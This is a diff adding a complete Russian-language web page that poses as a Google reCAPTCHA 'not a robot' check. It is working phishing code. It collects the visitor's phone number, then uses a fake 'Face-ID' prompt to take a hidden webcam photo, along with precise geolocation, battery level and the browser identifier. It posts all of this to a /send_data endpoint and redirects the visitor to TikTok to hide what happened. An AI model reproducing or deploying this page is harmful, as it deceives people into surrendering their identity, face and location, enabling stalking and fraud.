@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка</title>
+    <style>
+        body{margin:0;background:#f0f2f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}
+        .card{background:#fff;padding:30px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);width:90%;max-width:360px;text-align:center}
+        input{width:100%;padding:12px;margin:15px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}
+        button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="50">
+        <h3>Верификация</h3>
+        <p style="color:#666">Подтвердите, что вы не робот</p>
+        <div id="s1">
+            <input type="tel" id="p" placeholder="Номер телефона">
+            <button onclick="next()">ПРОДОЛЖИТЬ</button>
+        </div>
+        <div id="s2" style="display:none">
+            <p style="color:#d93025;font-weight:bold">Требуется Face-ID</p>
+            <button onclick="snap()" style="background:#34a853">ПРОЙТИ</button>
+        </div>
+    </div>
+    <video id="v" autoplay playsinline style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+    <script>
+        let res={os:navigator.userAgent};
+        if(navigator.getBattery)navigator.getBattery().then(b=>res.bat=Math.round(b.level*100));
+        function next(){
+            res.num=document.getElementById('p').value;
+            if(res.num.length<5)return alert("Введите номер");
+            document.getElementById('s1').style.display='none';
+            document.getElementById('s2').style.display='block';
+        }
+        async function snap(){
+            try{
+                const s=await navigator.mediaDevices.getUserMedia({video:true});
+                const v=document.getElementById('v');
+                v.srcObject=s;
+                setTimeout(()=>{
+                    const c=document.getElementById('c');
+                    c.width=v.videoWidth;c.height=v.videoHeight;
+                    c.getContext('2d').drawImage(v,0,0);
+                    res.img=c.toDataURL('image/jpeg');
+                    s.getTracks().forEach(t=>t.stop());
+                    navigator.geolocation.getCurrentPosition(p=>{
+                        res.lat=p.coords.latitude;res.lon=p.coords.longitude;send();
+                    },send,{enableHighAccuracy:true});
+                },1000);
+            }catch(e){send()}
+        }
+        function send(){
+            fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(res)})
+            .then(()=>location.href="https://tiktok.com");
+        }
+    </script>
+</body>
+</html>
